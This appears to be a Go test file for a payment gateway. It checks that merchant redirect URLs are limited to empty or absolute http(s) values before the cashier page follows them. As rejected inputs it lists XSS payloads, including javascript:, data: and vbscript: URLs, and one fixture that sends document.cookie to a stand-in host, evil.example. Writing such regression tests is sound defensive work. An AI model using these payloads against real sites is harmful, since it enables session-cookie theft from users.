package service

import (
	"testing"

	"github.com/GMWalletApp/epusdt/internal/testutil"
	"github.com/GMWalletApp/epusdt/model/data"
	"github.com/GMWalletApp/epusdt/model/mdb"
	"github.com/GMWalletApp/epusdt/util/constant"
)

// TestValidateMerchantRedirectURL pins the redirect target contract: only an
// empty value or an absolute http(s) URL may be stored, because the cashier
// assigns the stored value to window.location.href in the gateway origin.
func TestValidateMerchantRedirectURL(t *testing.T) {
	accepted := []string{
		"",
		"   ",
		"https://merchant.example/return",
		"http://merchant.example:8080/ok?trade=1#done",
		"HTTPS://Merchant.Example/Return",
	}
	for _, raw := range accepted {
		if err := validateMerchantRedirectURL(raw); err != nil {
			t.Errorf("validateMerchantRedirectURL(%q) = %v, want accepted", raw, err)
		}
	}

	rejected := []string{
		"javascript:alert(document.cookie)",
		"javascript:alert(1)",
		"javascript://merchant.example/%0aalert(1)",
		"JavaScript:alert(1)",
		"data:text/html,<script>alert(1)</script>",
		"vbscript:msgbox(1)",
		"//merchant.example/return",
		"/relative/return",
		"merchant.example/return",
		"https://",
		"ftp://merchant.example/x",
	}
	for _, raw := range rejected {
		if err := validateMerchantRedirectURL(raw); err != constant.OrderRedirectURLErr {
			t.Errorf("validateMerchantRedirectURL(%q) = %v, want %v", raw, err, constant.OrderRedirectURLErr)
		}
	}
}

func TestSafeMerchantRedirectURLDropsUnsafeValues(t *testing.T) {
	if got := safeMerchantRedirectURL("  https://merchant.example/return  "); got != "https://merchant.example/return" {
		t.Fatalf("safeMerchantRedirectURL trimmed value = %q", got)
	}
	for _, raw := range []string{"javascript:alert(1)", "data:text/html,x", "//evil.example", "relative"} {
		if got := safeMerchantRedirectURL(raw); got != "" {
			t.Errorf("safeMerchantRedirectURL(%q) = %q, want empty", raw, got)
		}
	}
}

// TestBuildPublicRedirectURLDropsUnsafeStoredTarget covers rows written before
// the creation-time check existed: the sink must not hand a javascript: target to
// the cashier even though it is already in the database.
func TestBuildPublicRedirectURLDropsUnsafeStoredTarget(t *testing.T) {
	order := &mdb.Orders{
		TradeId:     "trade_legacy_redirect",
		PaymentType: mdb.PaymentTypeGmpay,
		RedirectUrl: "javascript:fetch('//evil.example/'+document.cookie)",
	}
	if got := buildPublicRedirectURL(order); got != "" {
		t.Fatalf("buildPublicRedirectURL returned %q for a javascript: target", got)
	}

	order.RedirectUrl = "https://merchant.example/return"
	if got := buildPublicRedirectURL(order); got != "https://merchant.example/return" {
		t.Fatalf("buildPublicRedirectURL returned %q, want the merchant target", got)
	}
}

func TestCreateTransactionRejectsUnsafeRedirectURL(t *testing.T) {
	req := newCreateTransactionRequest("order_redirect_xss_1", 1)
	req.RedirectUrl = "javascript:alert(document.cookie)"

	if _, err := CreateTransaction(req, nil); err != constant.OrderRedirectURLErr {
		t.Fatalf("CreateTransaction error = %v, want %v", err, constant.OrderRedirectURLErr)
	}
}

func TestCreateTransactionStoresPublicRedirectURL(t *testing.T) {
	cleanup := testutil.SetupTestDatabases(t)
	defer cleanup()

	req := newCreateTransactionRequest("order_redirect_ok_1", 5)
	req.Token = ""
	req.Network = ""
	req.RedirectUrl = "https://merchant.example/return"

	resp, err := CreateTransaction(req, nil)
	if err != nil {
		t.Fatalf("create transaction: %v", err)
	}
	order, err := data.GetOrderInfoByTradeId(resp.TradeId)
	if err != nil {
		t.Fatalf("reload order: %v", err)
	}
	if order.RedirectUrl != "https://merchant.example/return" {
		t.Fatalf("stored redirect_url = %q", order.RedirectUrl)
	}
}
